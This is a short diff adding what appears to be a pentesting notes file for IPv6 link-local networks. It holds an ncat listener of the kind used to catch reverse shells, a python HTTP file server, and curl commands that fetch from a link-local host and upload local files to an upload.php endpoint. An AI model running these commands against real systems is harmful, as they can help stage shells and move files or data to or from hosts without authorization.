@@ -1,0 +1,11 @@
+ncat -6 -nlvp 1234
+
+python3 -m http.server  800  --bind ::
+
+curl http://[fe80::f4fe:4e4a:f9c7:41bb%eth0]
+
+curl http://fe80::f4fe:4e4a:f9c7:41bb%eth0
+
+curl -F "uploaded_file=@/tmp/upload.py" http://[fe80::f4fe:4e4a:f9c7:41bb%vmnet8]/upload.php
+
+curl -F "uploaded_file=@/tmp/report.txt" http://fe80::f4fe:4e4a:f9c7:41bb%eth0/upload.php
